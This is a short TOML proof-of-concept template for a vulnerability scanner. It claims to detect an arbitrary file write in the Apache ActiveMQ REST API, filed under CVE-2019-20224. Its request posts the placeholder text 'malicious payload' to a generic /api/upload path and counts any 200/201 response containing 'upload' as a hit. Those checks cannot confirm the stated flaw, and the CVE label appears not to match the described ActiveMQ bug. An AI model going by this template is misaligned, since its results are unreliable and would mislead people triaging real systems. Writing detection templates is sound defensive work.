[info]
author = "ave"
description = "Apache ActiveMQ REST API allows arbitrary file write via crafted upload request"
id = "POC-AVE-2019-0156"
name = "PoC for CVE-2019-20224"
severity = "medium"
tags = [
    "ave-2019-0156",
    "cve-2019-20224",
]
vuln_id = [
    "CVE-2019-20224",
    "AVE-2019-0156",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/api/upload"
protocol = "http"

[poc.requests.body]
content = "malicious payload"
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    201,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["upload"]
